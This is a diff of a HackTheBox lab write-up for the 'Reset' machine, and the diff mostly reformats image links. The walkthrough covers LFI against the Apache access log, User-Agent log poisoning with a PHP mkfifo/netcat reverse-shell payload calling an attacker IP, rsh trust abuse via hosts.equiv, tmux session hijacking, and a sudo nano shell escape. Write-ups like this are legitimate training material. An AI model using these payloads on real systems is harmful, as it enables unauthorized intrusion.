@@ -1,10 +1,11 @@
 ---
 title: Reset - LFI on User-Agent to RCE
 date: 2025-12-20 00:00:00 +0000
-categories: [HackTheBox Writeups]
+categories: [HackTheBox Writeups, Linux]
 tags: [hackthebox, linux]
 ---
-```bash
+
+```
 ares@legion:~/HackTheBox/Reset$ sudo nmap -sVC -A -T4 -p- --min-rate 1000 $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 06:05 EST
 Nmap scan report for 10.129.46.69 (10.129.46.69)
@@ -39,36 +40,38 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 93.34 seconds
-```bash
-![20251128131852.png](/assets/img/htb-writeups/Pasted image 20251128131852.png)
+```
+
+![[Pasted image 20251128131852.png]]
 
 Reset Password > Intercept > Repeater > Send > We get reset password in request
 
-![20251128134954.png](/assets/img/htb-writeups/Pasted image 20251128134954.png)
+![[Pasted image 20251128134954.png]]
 Both empty
 
-![20251128135020.png](/assets/img/htb-writeups/Pasted image 20251128135020.png)
+![[Pasted image 20251128135020.png]]
 /var/log?
 
 Update encoded parameter in post req:
 file=%2Fvar%2Flog%2Fapache2%2Faccess.log
-![20251128140112.png](/assets/img/htb-writeups/Pasted image 20251128140112.png)
+![[Pasted image 20251128140112.png]]
 
 Poison the Log: Insert PHP code into the log file. Since the User-Agent header is logged in every request, you can send a request where the User-Agent is a PHP script
-![20251128140752.png](/assets/img/htb-writeups/Pasted image 20251128140752.png)
+![[Pasted image 20251128140752.png]]
 ecnoded: file=%2Fvar%2Flog%2Fapache2%2Faccess.log
 decoded: /var/log/apache2/access.log
 
 Payload:
 ```
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.8 9090 >/tmp/f'); ?>
-```bash
+```
+
 Current user: 
 www-data
 
-![20251128153515.png](/assets/img/htb-writeups/Pasted image 20251128153515.png)
+![[Pasted image 20251128153515.png]]
 tmux session
-```bash
+```
 www-data@reset:/home/sadm$ find /tmp -name "tmux*" 2>/dev/null
 ls -la /tmp/tmux-*find /tmp -name "tmux*" 2>/dev/null
 /tmp/tmux-33
@@ -78,7 +81,8 @@ total 8
 drwx------ 2 www-data www-data 4096 Nov 28 13:35 .
 drwxrwxrwt 3 root     root     4096 Nov 28 13:35 ..
 srw-rw---- 1 www-data www-data    0 Nov 28 13:35 default
-```bash
+```
+
 The /etc/hosts.equiv file shows that sadm user can access the system via rsh/rlogin without a password from any host.
 ```
 ww-data@reset:/tmp/tmux-33$ cat /etc/hosts.equiv
@@ -89,7 +93,8 @@ cat /etc/hosts.equiv
 - local
 + sadm
 www-data@reset:/tmp/tmux-33$ 
-```bash
+```
+
 on kali:
 sudo useradd -m -s /bin/bash sadm
 sudo passwd sadm
@@ -98,11 +103,11 @@ rlogin 10.129.46.69 -l sadm
 OR
 rsh 10.129.46.69 -l sadm
 tmux attach -t sadm_session
-![20251128162642.png](/assets/img/htb-writeups/Pasted image 20251128162642.png)
+![[Pasted image 20251128162642.png]]
 sudo -l
-![20251128162819.png](/assets/img/htb-writeups/Pasted image 20251128162819.png)
+![[Pasted image 20251128162819.png]]
 
-```bash
+```
 sadm@reset:/etc$ cat firewall.sh 
 #!/bin/bash
 
@@ -113,10 +118,11 @@ iptables -t nat -F
 iptables -t mangle -F
 iptables -F
 iptables -X
-```bash
+```
+
 sudo nano /etc/firewall.sh
 while in nano CTRL+R and then CTRL+X to execute commands from nano interface
-![20251128163237.png](/assets/img/htb-writeups/Pasted image 20251128163237.png)
+![[Pasted image 20251128163237.png]]
 reset; bash 1>&0 2>&0
-![20251128163454.png](/assets/img/htb-writeups/Pasted image 20251128163454.png)
+![[Pasted image 20251128163454.png]]
 
